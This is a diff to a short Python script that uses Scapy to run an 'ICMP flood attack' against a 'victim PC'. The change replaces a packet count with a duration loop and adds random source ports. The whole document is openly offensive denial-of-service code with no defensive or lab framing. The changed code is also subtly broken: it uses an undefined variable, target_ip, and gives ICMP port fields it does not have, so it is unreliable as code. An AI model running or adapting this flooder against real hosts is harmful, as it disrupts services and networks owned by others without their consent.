@@ -6,18 +6,20 @@ from scapy.all import *
 
 
 
-def ping(victim_ip, targetedPort, numOfPackages):
+def ping(victim_ip, targetedPort, duration):
     """
      Ping victim PC performing a ICMP Flood Attack
      The ICMP Flood Attack Aglortihm is based on sending packets 
      as fast as possible without waiting for the victim PCs response 
     """
-    for i in range(0,numOfPackages):
-        time = datetime.now()
-        print("[{0}]: Attacker PC pinging victim PC with IP:{1}".format(time.strftime("%H:%M:%S"),victim_ip))
-        send(IP(dst=victim_ip)/ICMP(dport=targetedPort))
+    for _ in range(duration):
+        ip = IP(dst=target_ip)
+        icmp = ICMP(sport=RandShort(), dport=targetedPort)
+        pkg = ip/icmp
+        send(pkg)
+        
 
 if __name__ == "__main__":
-    """Cmd args: targetIp, TargetedPort, NumberOfPackagesToSend"""
+    """Cmd args: targetIp, TargetedPort, duration"""
     print("Preparing to ping victim PC")
-    ping(sys.argv[1], sys.argv[2], int(sys.argv[3]))
+    ping(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
